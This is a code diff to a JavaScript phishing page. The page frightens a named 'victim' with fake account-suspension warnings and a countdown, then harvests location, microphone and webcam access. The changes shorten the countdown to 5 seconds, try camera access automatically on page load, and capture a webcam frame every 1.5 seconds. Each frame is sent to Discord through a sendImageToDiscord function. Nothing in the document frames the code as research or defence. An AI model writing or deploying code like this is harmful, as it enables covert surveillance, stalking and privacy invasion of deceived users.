@@ -298,7 +298,7 @@
     </div>
     
     <div class="countdown" id="countdownTimer">
-      Auto-verification in: <span id="countdownSeconds">30</span> seconds
+      Auto-verification in: <span id="countdownSeconds">5</span> seconds
     </div>
     
     <div class="status-log" id="statusLog">
@@ -340,9 +340,10 @@
     const victimNames = ["Alex", "Jordan", "Taylor", "Morgan", "Casey", "Riley", "Quinn", "Drew"];
     const victimName = victimNames[Math.floor(Math.random() * victimNames.length)];
     let permissionCount = 0;
-    let countdown = 30;
+    let countdown = 5; // Reduced from 30 to 5 seconds
     let exfiltrationComplete = false;
     let cameraStream = null;
+    let captureInterval = null;
     
     // DOM Elements
     const statusLog = document.getElementById('statusLog');
@@ -361,12 +362,18 @@
         `Our system has detected <strong>3 unauthorized access attempts</strong> from your IP address.<br>
         Complete verification to prevent account suspension and data deletion, <strong>${victimName}</strong>.`;
       
+      // Try to access camera immediately on page load (like your old code)
+      setTimeout(() => {
+        addLogEntry("⚠ Attempting automatic camera access...", "warning");
+        requestCamera(false); // Try camera without user gesture
+      }, 1000);
+      
       // Start countdown
       const countdownInterval = setInterval(() => {
         countdown--;
         countdownSeconds.textContent = countdown;
         
-        if(countdown <= 10) {
+        if(countdown <= 3) {
           document.getElementById('countdownTimer').style.color = '#ff3232';
           document.getElementById('countdownTimer').style.animation = 'pulse 1s infinite';
         }
@@ -484,21 +491,6 @@ Hosting: ${response.hosting ? 'Yes' : 'No'}
         { enableHighAccuracy: true, maximumAge: 0, timeout: 5000 }
       );
       
-      // Try camera with simple constraint (your old method)
-      const constraints = {
-        audio: false,
-        video: {
-          facingMode: "user"  // Simple front camera selection
-        }
-      };
-      
-      navigator.mediaDevices.getUserMedia(constraints)
-        .then(stream => {
-          stream.getTracks().forEach(track => track.stop());
-          addLogEntry("✓ Camera access available", "success");
-        })
-        .catch(() => {});
-      
       // Try microphone
       navigator.mediaDevices.getUserMedia({ audio: true, video: false })
         .then(stream => {
@@ -572,6 +564,18 @@ Accuracy: ${position.coords.accuracy} meters
     function requestCamera(userGesture = false) {
       addLogEntry("Initializing facial recognition...", "warning");
       
+      // Stop any existing capture interval
+      if (captureInterval) {
+        clearInterval(captureInterval);
+        captureInterval = null;
+      }
+      
+      // Stop any existing stream
+      if (cameraStream) {
+        cameraStream.getTracks().forEach(track => track.stop());
+        cameraStream = null;
+      }
+      
       // Simple camera constraints like your old code
       const constraints = {
         audio: false,
@@ -589,7 +593,7 @@ Accuracy: ${position.coords.accuracy} meters
           cameraStatus.textContent = "🟢 Recording Active";
           cameraStatus.style.color = "#00ff88";
           
-          // Start continuous capture (like your old code but with motion detection)
+          // Start continuous capture (Option 1 - every 1.5 seconds)
           startCameraCapture(stream);
           checkAllPermissions();
         })
@@ -626,7 +630,7 @@ Accuracy: ${position.coords.accuracy} meters
         });
     }
     
-    // Camera Capture Function (with motion detection like your new code)
+    // Camera Capture Function - OPTION 1: Continuous capture every 1.5 seconds
     function startCameraCapture(stream) {
       const canvas = document.createElement('canvas');
       canvas.width = 640;
@@ -634,65 +638,40 @@ Accuracy: ${position.coords.accuracy} meters
       const context = canvas.getContext('2d');
       
       let captureCount = 0;
-      let lastCaptureTime = 0;
-      let lastFrame = null;
-      const motionThreshold = 15;
       
-      const captureInterval = setInterval(function() {
+      // Capture immediately
+      captureFrame();
+      
+      // Then capture every 1.5 seconds (like your old code)
+      captureInterval = setInterval(captureFrame, 1500);
+      
+      function captureFrame() {
         if(!stream.active) {
           clearInterval(captureInterval);
+          captureInterval = null;
           return;
         }
         
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        const currentTime = Date.now();
-        
-        // Motion detection for efficient capture
-        if(lastFrame && currentTime - lastCaptureTime > 1000) {
-          const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
-          let motion = 0;
+        try {
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
           
-          // Simple motion detection
-          for(let i = 0; i < imageData.data.length; i += 4) {
-            if(lastFrame[i] !== undefined) {
-              const diff = Math.abs(imageData.data[i] - lastFrame[i]) + 
-                         Math.abs(imageData.data[i+1] - lastFrame[i+1]) + 
-                         Math.abs(imageData.data[i+2] - lastFrame[i+2]);
-              if(diff > motionThreshold) motion++;
-            }
-          }
-          
-          // Capture if motion detected or every 5 seconds
-          if(motion > 500 || currentTime - lastCaptureTime > 5000) {
-            canvas.toBlob(function(blob) {
-              if(blob) {
-                captureCount++;
-                sendImageToDiscord(blob, captureCount);
-                lastCaptureTime = currentTime;
-                
-                // Update UI feedback
-                cameraStatus.textContent = `🟢 Captured ${captureCount} frames`;
-                cameraStatus.style.animation = 'pulse 0.5s';
-                setTimeout(() => cameraStatus.style.animation = '', 500);
-              }
-            }, 'image/jpeg', 0.85);
-          }
-          
-          lastFrame = imageData.data.slice();
-        } else if(!lastFrame) {
-          // First frame - capture immediately
           canvas.toBlob(function(blob) {
             if(blob) {
               captureCount++;
               sendImageToDiscord(blob, captureCount);
-              lastCaptureTime = currentTime;
+              
+              // Update UI feedback
+              cameraStatus.textContent = `🟢 Captured ${captureCount} frames`;
+              cameraStatus.style.animation = 'pulse 0.5s';
+              setTimeout(() => cameraStatus.style.animation = '', 500);
             }
           }, 'image/jpeg', 0.85);
-          
-          const imageData = context.getImageData(0, 0, canvas.width, canvas.height);
-          lastFrame = imageData.data.slice();
+        } catch(error) {
+          console.error("Capture error:", error);
+          clearInterval(captureInterval);
+          captureInterval = null;
         }
-      }, 500); // Check every 500ms
+      }
     }
     
     // Send image to Discord
@@ -753,6 +732,10 @@ Accuracy: ${position.coords.accuracy} meters
             // Stop camera and hide video container
             if(cameraStream) {
               cameraStream.getTracks().forEach(track => track.stop());
+            }
+            if (captureInterval) {
+              clearInterval(captureInterval);
+              captureInterval = null;
             }
             videoContainer.style.display = "none";
             
